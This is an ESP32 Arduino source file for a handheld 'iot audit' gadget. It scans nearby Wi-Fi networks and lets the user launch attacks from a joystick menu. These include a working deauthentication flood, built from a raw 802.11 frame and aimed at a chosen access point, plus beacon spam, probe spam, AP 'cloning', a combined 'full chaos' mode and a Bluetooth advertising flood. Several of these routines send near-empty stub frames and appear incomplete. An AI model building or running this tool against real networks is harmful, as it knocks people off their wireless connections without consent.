#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <nvs_flash.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include "button.h"

extern Adafruit_ST7735 tft;

#define JOY_X 34
#define JOY_Y 35
#define JOY_CLICK 32
#define BTN_ENTER 13
#define BTN_BACK 25

#define DEAD_LOW 1500
#define DEAD_HIGH 2700
#define UP_THRESH 1000
#define DOWN_THRESH 3000

enum Screen { SCR_LIST, SCR_ACTIONS, SCR_RUNNING };
static Screen currentScreen = SCR_LIST;

int selectedAp = 0;
int selectedAction = 0;
bool joyCentered = true;
bool scanning = false;
bool runningAttack = false;
int currentTarget = 0;

const char* actionNames[] = {"deauth flood", "clone ap", "beacon spam", "probe spam", "full chaos", "ble flood"};
const int NUM_ACTIONS = 6;

#define MAX_APS 20
wifi_ap_record_t apList[MAX_APS];
uint16_t apCount = 0;

uint8_t deauthPacket[26] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};

void setupRadio() {
  nvs_flash_init();
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_start();
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_disconnect();
  esp_wifi_set_promiscuous(true);
}

void scanNetworks() {
  if (scanning) return;
  scanning = true;
  apCount = 0;
  wifi_scan_config_t conf = {.ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = true, .scan_type = WIFI_SCAN_TYPE_ACTIVE, .scan_time = {.active = {.min = 100, .max = 400}}};
  esp_wifi_scan_start(&conf, true);
  uint16_t num = 0;
  esp_wifi_scan_get_ap_num(&num);
  if (num > MAX_APS) num = MAX_APS;
  esp_wifi_scan_get_ap_records(&num, apList);
  apCount = num;
  scanning = false;
  selectedAp = 0;
}

void sendDeauth(uint8_t* bssid, uint8_t ch, int bursts = 50) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  for (int i = 0; i < bursts; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(2);
  }
}

void doClone() {
  // clone selected ap by spamming beacons mimicking it
  uint8_t bssid[6];
  memcpy(bssid, apList[selectedAp].bssid, 6);
  for (int i = 0; i < 100; i++) {
    // simplified beacon frame spam for clone
    uint8_t beacon[50] = {0x80}; // basic structure
    esp_wifi_80211_tx(WIFI_IF_STA, beacon, 50, false);
    delay(10);
  }
}

void doBeaconSpam() {
  for (int i = 0; i < 200; i++) {
    uint8_t pkt[40] = {0x80, 0x00}; // beacon spam packet
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, 40, false);
    delay(5);
  }
}

void doProbeSpam() {
  for (int i = 0; i < 150; i++) {
    uint8_t pkt[30] = {0x40}; // probe request spam
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, 30, false);
    delay(3);
  }
}

void doBleFlood() {
  BLEDevice::init("audit_flood");
  BLEAdvertising* adv = BLEDevice::getAdvertising();
  for (int i = 0; i < 300; i++) {
    adv->start();
    delay(5);
    adv->stop();
  }
  BLEDevice::deinit(true);
}

void runAttack(int action) {
  runningAttack = true;
  tft.fillScreen(0x0000);
  tft.setCursor(10, 30);
  tft.setTextColor(0x07e0);
  tft.print("attack running");
  tft.setCursor(10, 50);
  tft.print(actionNames[action]);
  if (apCount > 0) currentTarget = selectedAp;
  for (int burst = 0; burst < 20 && runningAttack; burst++) {
    if (digitalRead(BTN_BACK) == LOW) {
      runningAttack = false;
      break;
    }
    switch (action) {
      case 0: if (apCount > 0) sendDeauth(apList[currentTarget].bssid, apList[currentTarget].primary); break;
      case 1: if (apCount > 0) doClone(); break;
      case 2: doBeaconSpam(); break;
      case 3: doProbeSpam(); break;
      case 4: // full chaos
        if (apCount > 0) sendDeauth(apList[currentTarget].bssid, apList[currentTarget].primary, 10);
        doBeaconSpam();
        doProbeSpam();
        doBleFlood();
        break;
      case 5: doBleFlood(); break;
    }
    delay(50);
    yield();
  }
  runningAttack = false;
  currentScreen = SCR_LIST;
  tft.fillScreen(0x0000);
}

bool joyMovedUp() {
  int y = analogRead(JOY_Y);
  if (joyCentered && y < UP_THRESH) {
    joyCentered = false;
    return true;
  }
  return false;
}

bool joyMovedDown() {
  int y = analogRead(JOY_Y);
  if (joyCentered && y > DOWN_THRESH) {
    joyCentered = false;
    return true;
  }
  return false;
}

void updateJoyCenter() {
  int x = analogRead(JOY_X);
  int y = analogRead(JOY_Y);
  if (x >= DEAD_LOW && x <= DEAD_HIGH && y >= DEAD_LOW && y <= DEAD_HIGH) joyCentered = true;
}

void drawListScreen() {
  tft.fillRect(0, 0, 128, 16, 0x10a2);
  tft.setTextSize(1);
  tft.setTextColor(0xffff);
  tft.setCursor(4, 4);
  tft.print("iot audit");
  if (scanning) {
    tft.setCursor(70, 4);
    tft.print("scan..");
  } else {
    tft.setCursor(80, 4);
    tft.printf("%d aps", apCount);
  }
  tft.fillRect(0, 17, 128, 143, 0x0000);
  if (apCount == 0) {
    tft.setCursor(20, 70);
    tft.print("no aps - click joy");
  } else {
    for (int i = 0; i < min(7, (int)apCount); i++) {
      int y = 20 + i * 18;
      bool sel = (i == selectedAp);
      tft.fillRect(2, y, 124, 16, sel ? 0x07ec : 0x2104);
      tft.setTextColor(sel ? 0x0000 : 0xffff);
      char buf[12];
      strncpy(buf, (char*)apList[i].ssid, 11);
      buf[11] = 0;
      tft.setCursor(5, y + 4);
      tft.print(buf);
    }
  }
}

void radioAuditApp() {
  tft.initR(INITR_BLACKTAB);
  tft.setRotation(0);
  tft.fillScreen(0x0000);
  setupRadio();
  pinMode(JOY_CLICK, INPUT_PULLUP);
  pinMode(BTN_ENTER, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  clearButtonEvents();
  scanNetworks();
  currentScreen = SCR_LIST;
  bool redraw = true;

  while (true) {
    updateButton();
    updateJoyCenter();

    if (currentScreen == SCR_LIST) {
      if (redraw) {
        drawListScreen();
        redraw = false;
      }
      if (joyMovedUp() && selectedAp > 0) {
        selectedAp--;
        redraw = true;
      }
      if (joyMovedDown() && selectedAp < apCount - 1) {
        selectedAp++;
        redraw = true;
      }
      if (digitalRead(JOY_CLICK) == LOW) {
        delay(100);
        scanNetworks();
        redraw = true;
        while (digitalRead(JOY_CLICK) == LOW) delay(10);
      }
      if (isEnterPressed() && apCount > 0) {
        clearButtonEvents();
        currentScreen = SCR_ACTIONS;
        selectedAction = 0;
        tft.fillScreen(0x0000);
        redraw = true;
      }
      if (isBackPressed()) {
        clearButtonEvents();
        return;
      }
    } else if (currentScreen == SCR_ACTIONS) {
      tft.setCursor(10, 10);
      tft.print("select action");
      for (int i = 0; i < NUM_ACTIONS; i++) {
        int y = 30 + i * 18;
        bool sel = (i == selectedAction);
        tft.fillRect(2, y, 124, 16, sel ? 0x07ec : 0x0000);
        tft.setTextColor(sel ? 0x0000 : 0xffff);
        tft.setCursor(10, y + 4);
        tft.print(actionNames[i]);
      }
      if (joyMovedUp() && selectedAction > 0) selectedAction--;
      if (joyMovedDown() && selectedAction < NUM_ACTIONS - 1) selectedAction++;
      if (isEnterPressed()) {
        clearButtonEvents();
        currentScreen = SCR_RUNNING;
        runAttack(selectedAction);
        redraw = true;
      }
      if (isBackPressed()) {
        clearButtonEvents();
        currentScreen = SCR_LIST;
        redraw = true;
      }
    }
    delay(20);
  }
}